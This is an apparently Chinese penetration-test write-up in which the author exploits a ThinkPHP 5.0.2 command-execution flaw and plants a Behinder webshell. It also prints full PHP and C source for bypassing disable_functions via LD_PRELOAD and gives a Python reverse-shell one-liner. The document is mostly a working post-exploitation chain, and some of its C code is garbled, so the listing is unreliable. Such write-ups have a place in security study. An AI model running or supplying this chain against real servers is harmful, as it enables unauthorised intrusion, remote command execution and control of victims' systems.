一次授权测试中，发现网站是ThinkPHP 5.0.2搭建的

![1604458477_5fa217ed27373eb586a41.png!small](https://image.3001.net/images/20201104/1604458477_5fa217ed27373eb586a41.png!small)

漏洞存在ThinkPHP 5.0.2 命令执行

![1604458490_5fa217fa3523f087fab75.png!small](https://image.3001.net/images/20201104/1604458490_5fa217fa3523f087fab75.png!small)

尝试写入冰蝎3.0的马

![1604458523_5fa2181b8e2047b3cceff.png!small](https://image.3001.net/images/20201104/1604458523_5fa2181b8e2047b3cceff.png!small)

汰，写入报错发现是&的问题。将&url编码。再次尝试

![1604458536_5fa21828a80c39350ea36.png!small](https://image.3001.net/images/20201104/1604458536_5fa21828a80c39350ea36.png!small)

链接失败。

经过本地尝试，发现是+的问题，再写入后，将+变为了空格。将其url编码，再次写入

链接发现失败，继续肝。

![1604458548_5fa21834358120b746ab3.png!small](https://image.3001.net/images/20201104/1604458548_5fa21834358120b746ab3.png!small)

除了写入，还可以使用PHP中的copy函数，在vps上开启服务，将vps的马子，直接下载至目标服务器上

![1604458562_5fa21842d682aa1f9528f.png!small](https://image.3001.net/images/20201104/1604458562_5fa21842d682aa1f9528f.png!small)

链接成功，接下来肯定是whoami一下。

![1604458570_5fa2184ad1f42716c4b2a.png!small](https://image.3001.net/images/20201104/1604458570_5fa2184ad1f42716c4b2a.png!small)

查看disable_functions，发现是可爱的宝塔禁用了passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru

还有啥是宝塔不能禁的。。。还能怎么办，接着肝，在网上学习了大佬的帖子

<https://www.meetsec.cn/index.php/archives/44/>

尝试利用[LD_PRELOAD](articles/web/192052.html)绕过[disable_functions](articles/web/192052.html)

直接上代码

 **bypass_disablefunc.php**

> <?php
>
> echo "<p> <b>example</b>:
> http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so
> </p>";
>
> $cmd = $_GET["cmd"];
>
> $out_path = $_GET["outpath"];
>
> $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
>
> echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
>
> putenv("EVIL_CMDLINE=" . $evil_cmdline);
>
> $so_path = $_GET["sopath"];
>
> putenv("LD_PRELOAD=" . $so_path);
>
> mail("", "", "", "");
>
> echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) .
> "</p>";
>
> unlink($out_path);
>
> ?>

 **bypass_disablefunc.c**

> #define _GNU_SOURCE
>
> #include stdlib.h
>
> #include stdio.h
>
> #include string.h
>
> extern char environ;
>
> __attribute__ ((__constructor__)) void preload (void)
>
> {
>
> get command line options and arg
>
> const char cmdline = getenv(EVIL_CMDLINE);
>
> unset environment variable LD_PRELOAD.
>
> unsetenv(LD_PRELOAD) no effect on some
>
> distribution (e.g., centos), I need crafty trick.
>
> int i;
>
> for (i = 0; environ[i]; ++i) {
>
> if (strstr(environ[i], LD_PRELOAD)) {
>
> environ[i][0] = '0';
>
> }
>
> }
>
> executive command
>
> system(cmdline);
>
> }

用命令 gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so 将
bypass_disablefunc.c 编译为共享对象 bypass_disablefunc_x64.so：

要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。

通过冰蝎上传，然后测试效果：

![1604458584_5fa21858db59841c56770.png!small](https://image.3001.net/images/20201104/1604458584_5fa21858db59841c56770.png!small)

命令执行成功。Nc反弹shell

![1604458595_5fa21863720f53b188727.png!small](https://image.3001.net/images/20201104/1604458595_5fa21863720f53b188727.png!small)

提示没有-e的参数，直接使用python反弹

python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8888));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

![1604458607_5fa2186faee6d33d8550b.png!small](https://image.3001.net/images/20201104/1604458607_5fa2186faee6d33d8550b.png!small)

反弹成功

总结：这次的测试，写入冰蝎的过程要注意编码问题。然后就是利用 _LD_PRELOAD_ 绕过 _disable_functions_ 。

